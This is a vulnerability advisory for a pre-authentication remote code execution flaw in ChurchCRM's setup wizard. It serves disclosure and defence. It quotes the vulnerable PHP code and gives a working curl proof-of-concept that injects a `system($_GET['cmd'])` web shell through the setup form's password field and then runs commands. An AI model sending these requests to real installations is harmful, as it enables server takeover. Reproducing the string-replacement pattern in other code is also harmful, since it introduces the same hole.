# ChurchCRM — Unauthenticated Remote Code Execution in Setup Wizard (<= 5.18.0)

**Disclosure status:** Reported to vendor (GitHub Security Advisory GHSA-m8jq-j3p9-2xf3). Vendor acknowledged but provided insufficient response. No vendor patch available as of this advisory.

**Affected product**
- ChurchCRM — versions **<= 5.18.0**

**Summary**
A critical pre-authentication remote code execution vulnerability in ChurchCRM's setup wizard allows unauthenticated attackers to inject arbitrary PHP code during the initial installation process. User input from the setup form is directly concatenated into a PHP configuration template without validation, leading to complete server compromise during the brief installation window.

**Required privileges**
- None — vulnerability is pre-authentication and affects fresh installations

**Impact**
- **Critical** pre-authentication Remote Code Execution (as web server user)
- Complete server takeover without any authentication required
- Execution of arbitrary system commands during installation phase
- Potential for persistent backdoor installation before application setup completes
- Infrastructure compromise affecting the underlying server environment

**Technical Details**
The vulnerability exists in `setup/routes/setup.php` where user input is directly string-replaced into a PHP configuration template:

```php
// Line 35: No authentication required
$setupData = $request->getParsedBody();

// Lines 39-45: Direct string replacement with user input
$template = str_replace('||DB_PASSWORD||', $setupData['DB_PASSWORD'], $template);
$template = str_replace('||ROOT_PATH||', $setupData['ROOT_PATH'], $template);
$template = str_replace('||URL||', $setupData['URL'], $template);

// Line 47: Write user-controlled content to executable PHP file
file_put_contents(SystemURLs::getDocumentRoot() . '/Include/Config.php', $template);
```

Any parameter in the setup form can inject PHP code that gets written to `Include/Config.php` and executed on every subsequent page load.

**Proof-of-Concept**

1. Access the setup wizard (no authentication required):
   ```bash
   curl 'http://[target]/setup/'
   ```

2. Submit malicious payload via form parameter:
   ```bash
   curl 'http://[target]/setup/' \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'DB_SERVER_NAME=localhost&DB_SERVER_PORT=3306&DB_NAME=test&DB_USER=root&DB_PASSWORD=test123'\''%3B+system($_GET["cmd"])%3B+//&ROOT_PATH=/&URL=http://example.com/'
   ```

3. Execute arbitrary commands:
   ```bash
   curl 'http://[target]/?cmd=whoami'
   # Response: www-data
   
   curl 'http://[target]/?cmd=id' 
   # Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

**Confirmed results (observed)**
- Successful injection of payload `'; system($_GET["cmd"]); //` into Config.php
- Remote command execution confirmed with system commands
- Full web server user access during installation window

**Vendor Response Analysis**
A project contributor acknowledged that this "mainly applies to new installations only" and that "once the installation is finished, the specified URL will stop working." While noting "no data at risk of being leaked," this assessment doesn't fully account for:

- **Brief window ≠ No risk**: Even temporary RCE provides sufficient time for infrastructure compromise
- **No data at risk ≠ No impact**: Server compromise, backdoor installation, and persistent access are significant impacts
- **Installation-only ≠ Low severity**: Pre-auth RCE during mandatory setup phase affects all fresh deployments

**Mitigation / Workarounds**
- **Immediate**: Restrict network access to setup wizard during installation
- **Recommended vendor fixes**:
  - Implement input validation and sanitization for all setup form parameters
  - Use parameterized configuration generation instead of string replacement
  - Add CSRF protection and basic rate limiting to setup endpoints
  - Consider moving sensitive configuration generation to CLI-only tools

**Disclosure timeline**
- 2025-09-24 — Reported via GitHub Security Advisory GHSA-m8jq-j3p9-2xf3
- 2025-10-04 — Project contributor responded, noted issue affects "new installations only"
- 2025-10-04 — Reporter clarified infrastructure compromise risks during installation window
- 2025-10-08 — No further vendor response; publishing advisory for CVE coordination

**References**
- GitHub Security Advisory: GHSA-m8jq-j3p9-2xf3
- ChurchCRM Setup Route: `setup/routes/setup.php`

**Contact**
- Reporter: uartu0@gmail.com

---

This advisory documents a critical pre-authentication RCE vulnerability that affects the mandatory installation process of ChurchCRM. While the attack window is limited to the installation phase, the impact includes full server compromise and potential persistent access.